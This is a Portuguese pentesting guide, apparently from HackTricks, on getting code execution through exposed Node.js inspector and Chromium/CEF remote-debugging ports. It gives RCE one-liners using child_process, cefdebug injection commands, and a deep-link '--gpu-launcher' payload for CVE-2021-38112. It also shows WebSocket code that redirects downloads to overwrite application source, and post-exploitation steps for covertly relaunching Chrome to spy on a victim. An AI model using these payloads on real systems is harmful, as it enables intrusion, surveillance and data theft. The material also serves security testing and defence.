# Abuso do depurador Node/CEF

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas

[Dos docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Quando iniciado com o switch `--inspect`, um processo Node.js escuta por um cliente de depuração. Por **padrão**, ele escutará no host e porta **`127.0.0.1:9229`**. Cada processo também é atribuído um **UUID** **único**.

Os clientes do Inspector devem conhecer e especificar o endereço do host, a porta e o UUID para se conectar. Uma URL completa parecerá algo como `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Como o **depurador tem acesso total ao ambiente de execução do Node.js**, um ator malicioso capaz de se conectar a esta porta pode ser capaz de executar código arbitrário em nome do processo Node.js (**potencial escalonamento de privilégios**).

Existem várias maneiras de iniciar um inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando você inicia um processo inspecionado, algo como isto aparecerá:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processos baseados em **CEF** (**Chromium Embedded Framework**) precisam usar o parâmetro: `--remote-debugging-port=9222` para abrir o **debugger** (as proteções SSRF permanecem muito semelhantes). No entanto, eles **em vez disso** de conceder uma sessão de **debug** **NodeJS** se comunicarão com o navegador usando o [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), esta é uma interface para controlar o navegador, mas não há um RCE direto.

Quando você inicia um navegador em modo de depuração, algo assim aparecerá:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets e política de mesma origem <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Sites abertos em um navegador da web podem fazer solicitações WebSocket e HTTP sob o modelo de segurança do navegador. Uma **conexão HTTP inicial** é necessária para **obter um id de sessão de depuração único**. A **política de mesma origem** **impede** que sites consigam fazer **essa conexão HTTP**. Para segurança adicional contra [**ataques de reatribuição de DNS**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** o Node.js verifica se os **'Host' headers** para a conexão especificam um **endereço IP** ou **`localhost`** ou **`localhost6`** precisamente.

> [!NOTE]
> Essas **medidas de segurança impedem a exploração do inspetor** para executar código **apenas enviando uma solicitação HTTP** (o que poderia ser feito explorando uma vulnerabilidade SSRF).

### Iniciando o inspetor em processos em execução

Você pode enviar o **sinal SIGUSR1** para um processo nodejs em execução para fazer com que ele **inicie o inspetor** na porta padrão. No entanto, observe que você precisa ter privilégios suficientes, então isso pode lhe conceder **acesso privilegiado a informações dentro do processo**, mas não uma escalada de privilégio direta.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!NOTE]
> Isso é útil em contêineres porque **encerrar o processo e iniciar um novo** com `--inspect` **não é uma opção** porque o **contêiner** será **finalizado** com o processo.

### Conectar ao inspetor/debugger

Para se conectar a um **navegador baseado em Chromium**, as URLs `chrome://inspect` ou `edge://inspect` podem ser acessadas para Chrome ou Edge, respectivamente. Ao clicar no botão Configurar, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Execução Remota de Código (RCE):

![](<../../images/image (674).png>)

Usando a **linha de comando**, você pode se conectar a um debugger/inspetor com:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
A ferramenta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspetores** em execução localmente e **injetar código** neles.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!NOTE]
> Note que **explorações de RCE do NodeJS não funcionarão** se conectadas a um navegador via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (você precisa verificar a API para encontrar coisas interessantes para fazer com isso).

## RCE no Depurador/Inspector do NodeJS

> [!NOTE]
> Se você veio aqui procurando como obter [**RCE a partir de um XSS no Electron, por favor, verifique esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)

Algumas maneiras comuns de obter **RCE** quando você pode **conectar** a um **inspector** do Node é usando algo como (parece que isso **não funcionará em uma conexão com o protocolo Chrome DevTools**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Você pode verificar a API aqui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Nesta seção, vou apenas listar coisas interessantes que encontrei que as pessoas usaram para explorar este protocolo.

### Injeção de Parâmetros via Deep Links

No [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), a segurança da Rhino descobriu que um aplicativo baseado em CEF **registrou um URI personalizado** no sistema (workspaces://) que recebia o URI completo e então **iniciava o aplicativo baseado em CEF** com uma configuração que estava parcialmente construída a partir desse URI.

Foi descoberto que os parâmetros do URI eram decodificados em URL e usados para iniciar o aplicativo básico do CEF, permitindo que um usuário **injetasse** a flag **`--gpu-launcher`** na **linha de comando** e executasse coisas arbitrárias.

Então, um payload como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Executará um calc.exe.

### Substituir Arquivos

Altere a pasta onde **os arquivos baixados serão salvos** e baixe um arquivo para **substituir** o **código fonte** frequentemente usado da aplicação pelo seu **código malicioso**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE e exfiltração

De acordo com este post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) é possível obter RCE e exfiltrar páginas internas do theriver.

### Pós-Exploração

Em um ambiente real e **após comprometer** um PC de usuário que utiliza um navegador baseado em Chrome/Chromium, você poderia iniciar um processo do Chrome com a **depuração ativada e redirecionar a porta de depuração** para que você possa acessá-la. Dessa forma, você será capaz de **inspecionar tudo o que a vítima faz com o Chrome e roubar informações sensíveis**.

A maneira furtiva é **terminar todos os processos do Chrome** e então chamar algo como
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referências

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
